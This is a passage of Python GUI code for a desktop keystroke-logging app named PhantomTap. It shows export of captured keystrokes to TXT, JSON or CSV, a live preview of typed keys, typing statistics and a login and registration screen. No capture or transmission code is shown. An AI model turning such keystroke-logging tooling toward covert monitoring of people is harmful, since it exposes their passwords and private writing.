            font=ctk.CTkFont(size=14, weight="bold"),
            fg_color=self.colors['secondary'],
            hover_color=self.colors['secondary_dark']
        ).pack(side="left", padx=10)
        
        ctk.CTkButton(
            button_frame,
            text="Cancel",
            command=dialog.destroy,
            width=150,
            height=45,
            font=ctk.CTkFont(size=14, weight="bold"),
            fg_color=self.colors['danger'],
            hover_color="#d32f2f"
        ).pack(side="left", padx=10)
    
    def _perform_export(self, fmt):
        ext_map = {"txt": ".txt", "json": ".json", "csv": ".csv"}
        ext = ext_map.get(fmt, ".txt")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        default_name = f"PhantomTap_{self.keylogger.session_name}_{timestamp}{ext}"
        
        path = filedialog.asksaveasfilename(
            defaultextension=ext,
            initialfile=default_name,
            filetypes=[(f"{fmt.upper()} files", f"*{ext}"), ("All files", "*.*")],
            parent=self
        )

        if not path:
            return

        try:
            success = False
            if fmt == "json":
                success = self.keylogger.save_to_json(path)
            elif fmt == "txt":
                success = self.keylogger.save_to_txt(path)
            elif fmt == "csv":
                success = self.keylogger.save_to_csv(path)

            if success:
                self.show_success_dialog(
                    "Export Successful",
                    f"✅ Data exported successfully!\n\n"
                    f"📁 Filename: {os.path.basename(path)}\n"
                    f"📍 Location: {os.path.dirname(path)}\n"
                    f"📊 Format: {fmt.upper()}\n"
                    f"📝 Records: {self.keylogger.total_keys} keystrokes",
                    path
                )
            else:
                self.show_error_dialog("Export Failed", "❌ Failed to save file")
                
        except Exception as e:
            self.show_error_dialog("Export Error", f"❌ Export failed:\n{str(e)}")

    def _start_updates(self):
        self._update_display()
        self.update_timer = self.after(500, self._start_updates)

    def _update_display(self):
        if 'total_keys' in self.stat_cards:
            self.stat_cards['total_keys'].configure(text=str(self.keylogger.total_keys))
        
        if 'words' in self.stat_cards:
            self.stat_cards['words'].configure(text=str(self.keylogger.words_typed))
        
        accuracy = self.keylogger.get_typing_accuracy()
        if 'accuracy' in self.stat_cards:
            self.stat_cards['accuracy'].configure(text=f"{accuracy}%")
        
        stats = self.keylogger.get_statistics()
        kpm = stats.get('keys_per_minute', 0)
        
        if 'speed' in self.stat_cards:
            self.stat_cards['speed'].configure(text=f"{kpm:.1f} KPM")
        
        session_start = stats.get('session_start')
        if session_start and self.keylogger.is_logging:
            duration = datetime.now() - session_start
            total_seconds = int(duration.total_seconds())
            minutes = total_seconds // 60
            seconds = total_seconds % 60
            if 'duration' in self.stat_cards:
                self.stat_cards['duration'].configure(text=f"{minutes:02d}:{seconds:02d}")
        else:
            if 'duration' in self.stat_cards:
                self.stat_cards['duration'].configure(text="00:00")
        
        self.count_var.configure(text=str(self.keylogger.total_keys))
        
        self._update_preview()

    def _update_preview(self):
        self.preview_text.configure(state="normal")
        self.preview_text.delete("1.0", "end")
        
        if self.keylogger.buffer:
            display_text = ""
            for event in self.keylogger.buffer[-40:]:
                key_display = event.key
                if key_display == '[ENTER]':
                    display_text += "⏎\n"
                elif key_display == '[SPACE]':
                    display_text += " "
                elif key_display == '[TAB]':
                    display_text += "→"
                elif key_display == '[BACKSPACE]':
                    display_text += "⌫"
                elif key_display.startswith('[') and key_display.endswith(']'):
                    display_text += f"⟨{key_display[1:-1]}⟩"
                else:
                    display_text += key_display
            
            self.preview_text.insert("end", display_text)
            self.preview_text.see("end")
        else:
            self.preview_text.insert("end", "👻 PhantomTap waiting for input...\nStart monitoring and begin typing!")
            
        self.preview_text.configure(state="disabled")

    def show_error_dialog(self, title, message):
        dialog = ctk.CTkToplevel(self)
        dialog.title(title)
        dialog.geometry("450x280")
        dialog.transient(self)
        dialog.grab_set()
        
        dialog.update_idletasks()
        x = self.winfo_x() + (self.winfo_width() // 2) - (450 // 2)
        y = self.winfo_y() + (self.winfo_height() // 2) - (280 // 2)
        dialog.geometry(f'450x280+{x}+{y}')
        
        ctk.CTkLabel(
            dialog,
            text="❌",
            font=ctk.CTkFont(size=54)
        ).pack(pady=20)
        
        ctk.CTkLabel(
            dialog,
            text=message,
            font=ctk.CTkFont(size=13),
            wraplength=400
        ).pack(pady=10)
        
        ctk.CTkButton(
            dialog,
            text="OK",
            command=dialog.destroy,
            width=140,
            height=40,
            font=ctk.CTkFont(size=13),
            fg_color=self.colors['danger']
        ).pack(pady=10)

    def show_warning_dialog(self, title, message):
        dialog = ctk.CTkToplevel(self)
        dialog.title(title)
        dialog.geometry("450x280")
        dialog.transient(self)
        dialog.grab_set()
        
        dialog.update_idletasks()
        x = self.winfo_x() + (self.winfo_width() // 2) - (450 // 2)
        y = self.winfo_y() + (self.winfo_height() // 2) - (280 // 2)
        dialog.geometry(f'450x280+{x}+{y}')
        
        ctk.CTkLabel(
            dialog,
            text="⚠️",
            font=ctk.CTkFont(size=54)
        ).pack(pady=20)
        
        ctk.CTkLabel(
            dialog,
            text=message,
            font=ctk.CTkFont(size=13),
            wraplength=400
        ).pack(pady=10)
        
        ctk.CTkButton(
            dialog,
            text="OK",
            command=dialog.destroy,
            width=140,
            height=40,
            font=ctk.CTkFont(size=13),
            fg_color=self.colors['warning']
        ).pack(pady=10)

    def show_info_dialog(self, title, message):
        dialog = ctk.CTkToplevel(self)
        dialog.title(title)
        dialog.geometry("500x350")
        dialog.transient(self)
        dialog.grab_set()
        
        dialog.update_idletasks()
        x = self.winfo_x() + (self.winfo_width() // 2) - (500 // 2)
        y = self.winfo_y() + (self.winfo_height() // 2) - (350 // 2)
        dialog.geometry(f'500x350+{x}+{y}')
        
        ctk.CTkLabel(
            dialog,
            text="👻",
            font=ctk.CTkFont(size=54)
        ).pack(pady=20)
        
        ctk.CTkLabel(
            dialog,
            text=message,
            font=ctk.CTkFont(size=13),
            wraplength=450,
            justify="left"
        ).pack(pady=10)
        
        ctk.CTkButton(
            dialog,
            text="OK",
            command=dialog.destroy,
            width=140,
            height=40,
            font=ctk.CTkFont(size=13),
            fg_color=self.colors['primary']
        ).pack(pady=10)

    def show_success_dialog(self, title, message, file_path):
        dialog = ctk.CTkToplevel(self)
        dialog.title(title)
        dialog.geometry("500x380")
        dialog.transient(self)
        dialog.grab_set()
        
        dialog.update_idletasks()
        x = self.winfo_x() + (self.winfo_width() // 2) - (500 // 2)
        y = self.winfo_y() + (self.winfo_height() // 2) - (380 // 2)
        dialog.geometry(f'500x380+{x}+{y}')
        
        ctk.CTkLabel(
            dialog,
            text="✅",
            font=ctk.CTkFont(size=54)
        ).pack(pady=20)
        
        ctk.CTkLabel(
            dialog,
            text=message,
            font=ctk.CTkFont(size=13),
            wraplength=450,
            justify="left"
        ).pack(pady=10)
        
        def open_location():
            try:
                os.startfile(os.path.dirname(file_path))
            except:
                pass
        
        button_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        button_frame.pack(pady=15)
        
        ctk.CTkButton(
            button_frame,
            text="📂 Open Location",
            command=open_location,
            width=160,
            height=42,
            font=ctk.CTkFont(size=13, weight="bold"),
            fg_color=self.colors['info']
        ).pack(side="left", padx=8)
        
        ctk.CTkButton(
            button_frame,
            text="OK",
            command=dialog.destroy,
            width=160,
            height=42,
            font=ctk.CTkFont(size=13, weight="bold"),
            fg_color=self.colors['success']
        ).pack(side="left", padx=8)


class PhantomTapAuthApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("PhantomTap - Authentication")
        self.geometry("550x650")
        
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        self.db = DatabaseManager()

        self.container = ctk.CTkFrame(self, fg_color="transparent")
        self.container.grid(row=0, column=0, sticky="nsew")
        self.container.grid_rowconfigure(0, weight=1)
        self.container.grid_columnconfigure(0, weight=1)

        self.show_login_frame()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def clear_frame(self):
        for widget in self.container.winfo_children():
            widget.destroy()

    def toggle_password_visibility(self, entry, toggle_btn):
        if entry.cget("show") == "*":
            entry.configure(show="")
            toggle_btn.configure(text="🙈")
        else:
            entry.configure(show="*")
            toggle_btn.configure(text="👁")

    def show_login_frame(self):
        self.clear_frame()

        content_frame = ctk.CTkFrame(self.container, fg_color="transparent")
        content_frame.grid(row=0, column=0, sticky="nsew")
        content_frame.grid_rowconfigure(0, weight=1)
        content_frame.grid_rowconfigure(1, weight=0)
        content_frame.grid_rowconfigure(2, weight=1)
        content_frame.grid_columnconfigure(0, weight=1)

        inner_frame = ctk.CTkFrame(content_frame, fg_color="transparent")
        inner_frame.grid(row=1, column=0, sticky="n")
        inner_frame.grid_columnconfigure(0, weight=1)

        title = ctk.CTkLabel(inner_frame, text="PhantomTap Login Portal", 
                            font=ctk.CTkFont(size=34, weight="bold"), 
                            text_color=PHANTOM_GREEN)
        title.grid(row=0, column=0, pady=(40, 10), sticky="ew")

        subtitle = ctk.CTkLabel(inner_frame, text="Welcome Back", font=ctk.CTkFont(size=15,weight="bold"), text_color="gray")
        subtitle.grid(row=1, column=0, pady=(0, 30), sticky="ew")

        self.login_user_entry = ctk.CTkEntry(inner_frame, placeholder_text="Username", height=45)
        self.login_user_entry.grid(row=2, column=0, pady=10, sticky="ew", padx=40)
        self.login_user_entry.bind("<Return>", lambda event: self.login_pass_entry.focus())

        password_frame = ctk.CTkFrame(inner_frame, fg_color="transparent")
        password_frame.grid(row=3, column=0, pady=10, sticky="ew", padx=40)
        password_frame.grid_columnconfigure(0, weight=1)

        self.login_pass_entry = ctk.CTkEntry(password_frame, placeholder_text="Password", show="*", height=45)
        self.login_pass_entry.grid(row=0, column=0, sticky="ew")
        self.login_pass_entry.bind("<Return>", lambda event: self.login_event())

        self.login_toggle_btn = ctk.CTkButton(password_frame, text="👁", width=45, height=45,
                                               fg_color=PHANTOM_GREEN,
                                               hover_color=PHANTOM_GREEN_HOVER,
                                               command=lambda: self.toggle_password_visibility(
                                                   self.login_pass_entry, self.login_toggle_btn))
        self.login_toggle_btn.grid(row=0, column=1, padx=(5, 0))

        login_btn = ctk.CTkButton(inner_frame, text="Login", height=45, 
                                  fg_color=PHANTOM_GREEN,
                                  hover_color=PHANTOM_GREEN_HOVER,
                                  command=self.login_event)
        login_btn.grid(row=4, column=0, pady=20, sticky="ew", padx=40)

        switch_btn = ctk.CTkButton(inner_frame, text="Don't have an account? Register", 
                                   fg_color="transparent", text_color="gray", 
                                   hover_color="gray", command=self.show_register_frame)
        switch_btn.grid(row=5, column=0, pady=10, sticky="ew")

    def show_register_frame(self):
        self.clear_frame()

        content_frame = ctk.CTkFrame(self.container, fg_color="transparent")
        content_frame.grid(row=0, column=0, sticky="nsew")
        content_frame.grid_rowconfigure(0, weight=1)
        content_frame.grid_rowconfigure(1, weight=0)
        content_frame.grid_rowconfigure(2, weight=1)
        content_frame.grid_columnconfigure(0, weight=1)

        inner_frame = ctk.CTkFrame(content_frame, fg_color="transparent")
        inner_frame.grid(row=1, column=0, sticky="n")
        inner_frame.grid_columnconfigure(0, weight=1)

        title = ctk.CTkLabel(inner_frame, text="PhantomTap", 
                            font=ctk.CTkFont(size=34, weight="bold"),
                            text_color=PHANTOM_GREEN)
        title.grid(row=0, column=0, pady=(40, 10), sticky="ew")

        subtitle = ctk.CTkLabel(inner_frame, text="Create a new account", text_color="gray", font=ctk.CTkFont(size=14))
        subtitle.grid(row=1, column=0, pady=(0, 30), sticky="ew")

        self.reg_user_entry = ctk.CTkEntry(inner_frame, placeholder_text="Username", height=45)
        self.reg_user_entry.grid(row=2, column=0, pady=10, sticky="ew", padx=40)
        self.reg_user_entry.bind("<Return>", lambda event: self.reg_pass_entry.focus())

        password_frame = ctk.CTkFrame(inner_frame, fg_color="transparent")
        password_frame.grid(row=3, column=0, pady=10, sticky="ew", padx=40)
        password_frame.grid_columnconfigure(0, weight=1)

        self.reg_pass_entry = ctk.CTkEntry(password_frame, placeholder_text="Password", show="*", height=45)
        self.reg_pass_entry.grid(row=0, column=0, sticky="ew")
        self.reg_pass_entry.bind("<Return>", lambda event: self.reg_confirm_entry.focus())

        self.reg_toggle_btn = ctk.CTkButton(password_frame, text="👁", width=45, height=45,
                                             fg_color=PHANTOM_GREEN,
                                             hover_color=PHANTOM_GREEN_HOVER,
                                             command=lambda: self.toggle_password_visibility(
                                                 self.reg_pass_entry, self.reg_toggle_btn))
        self.reg_toggle_btn.grid(row=0, column=1, padx=(5, 0))

        confirm_password_frame = ctk.CTkFrame(inner_frame, fg_color="transparent")
        confirm_password_frame.grid(row=4, column=0, pady=10, sticky="ew", padx=40)
        confirm_password_frame.grid_columnconfigure(0, weight=1)

        self.reg_confirm_entry = ctk.CTkEntry(confirm_password_frame, placeholder_text="Confirm Password", show="*", height=45)
        self.reg_confirm_entry.grid(row=0, column=0, sticky="ew")
        self.reg_confirm_entry.bind("<Return>", lambda event: self.register_event())

        self.reg_confirm_toggle_btn = ctk.CTkButton(confirm_password_frame, text="👁", width=45, height=45,
                                                     fg_color=PHANTOM_GREEN,
                                                     hover_color=PHANTOM_GREEN_HOVER,
                                                     command=lambda: self.toggle_password_visibility(
                                                         self.reg_confirm_entry, self.reg_confirm_toggle_btn))
        self.reg_confirm_toggle_btn.grid(row=0, column=1, padx=(5, 0))

        register_btn = ctk.CTkButton(inner_frame, text="Register", height=45, 
                                     fg_color=PHANTOM_GREEN,
                                     hover_color=PHANTOM_GREEN_HOVER,
                                     command=self.register_event)
        register_btn.grid(row=5, column=0, pady=20, sticky="ew", padx=40)

        switch_btn = ctk.CTkButton(inner_frame, text="Already have an account? Login", 
                                   fg_color="transparent", text_color="gray", 
                                   hover_color="gray", command=self.show_login_frame)
        switch_btn.grid(row=6, column=0, pady=10, sticky="ew")

    def show_keylogger_dashboard(self, username):
        self.withdraw()
        app = PhantomTapGUI(username, self)
        app.focus()

    def login_event(self):
        username = self.login_user_entry.get()
        password = self.login_pass_entry.get()

        if not username or not password:
            messagebox.showerror("Error", "Please fill in all fields.")
            return

        if self.db.verify_login(username, password):
            messagebox.showinfo("Success", "Login Successful!")
            self.show_keylogger_dashboard(username)
        else:
            messagebox.showerror("Error", "Invalid username or password.")

    def register_event(self):
        username = self.reg_user_entry.get()
        password = self.reg_pass_entry.get()
        confirm = self.reg_confirm_entry.get()

        if not username or not password or not confirm:
            messagebox.showerror("Error", "Please fill in all fields.")
            return

        if password != confirm:
            messagebox.showerror("Error", "Passwords do not match.")
            return

        if self.db.register_user(username, password):
            messagebox.showinfo("Success", "Account created successfully!")
            self.show_login_frame()
        else:
            messagebox.showerror("Error", "Username already exists.")

    def on_closing(self):
        self.db.close()
        self.destroy()

def main():
    if not PYNPUT_AVAILABLE:
        root = ctk.CTk()
        root.withdraw()
        
        dialog = ctk.CTkToplevel(root)
        dialog.title("Missing Dependency")
        dialog.geometry("500x350")
        dialog.transient(root)
        dialog.grab_set()
        
        dialog.update_idletasks()
        x = (dialog.winfo_screenwidth() // 2) - (500 // 2)
        y = (dialog.winfo_screenheight() // 2) - (350 // 2)
        dialog.geometry(f'500x350+{x}+{y}')
        
        ctk.CTkLabel(
            dialog,
            text="❌",
            font=ctk.CTkFont(size=70)
        ).pack(pady=20)
        
        ctk.CTkLabel(
            dialog,
            text="pynput library not installed!",
            font=ctk.CTkFont(size=20, weight="bold"),
            text_color="#ff5252"
        ).pack(pady=10)
        
        ctk.CTkLabel(
            dialog,
            text="Please install the required library:",
            font=ctk.CTkFont(size=14)
        ).pack()
        
        cmd_frame = ctk.CTkFrame(dialog, fg_color="#132f4c", corner_radius=8)
        cmd_frame.pack(pady=15, padx=40, fill="x")
        
        ctk.CTkLabel(
            cmd_frame,
            text="pip install pynput",
            font=ctk.CTkFont(family="Consolas", size=14),
            text_color="#00bcd4"
        ).pack(pady=12)
        
        ctk.CTkButton(
            dialog,
            text="OK",
            command=lambda: [dialog.destroy(), root.destroy()],
            width=140,
            height=42,
            font=ctk.CTkFont(size=14),
            fg_color="#00bcd4",
            hover_color="#00838f"
        ).pack(pady=15)
        
        root.mainloop()
    else:
        auth_app = PhantomTapAuthApp()
        auth_app.mainloop()

if __name__ == "__main__":
    main()